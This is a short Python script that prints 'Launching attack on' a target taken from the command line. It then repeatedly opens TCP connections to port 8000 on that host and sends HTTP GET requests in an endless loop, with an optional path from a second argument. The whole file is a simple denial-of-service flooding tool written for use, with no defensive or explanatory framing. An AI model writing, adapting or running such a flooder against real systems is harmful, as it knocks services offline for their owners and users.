import socket, sys, os
import datetime
date = str(datetime.datetime.now())
print ("Launching attack on " + sys.argv[1]  + "..." + date)
def launchAttack(): 
    port = 8000
    route = "/"
    req = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    req.connect((sys.argv[1] ,port))
    if len(sys.argv) == 2:
        print (">> GET /" + " HTTP/1.1")
        req.send("GET " + route + " HTTP/1.1\r\n")
        req.send("Host: " + sys.argv[1]  + "\r\n\r\n")
        req.close()
    
    elif len(sys.argv) == 3:
        route = route + sys.argv[2]
        print (">> GET /" + sys.argv[2] + " HTTP/1.1")
        req.send("GET " + route + " HTTP/1.1\r\n")
        req.send("Host: " + sys.argv[1]  + "\r\n\r\n")
        req.close()

    else:
        sys.exit()
while True:
    launchAttack()
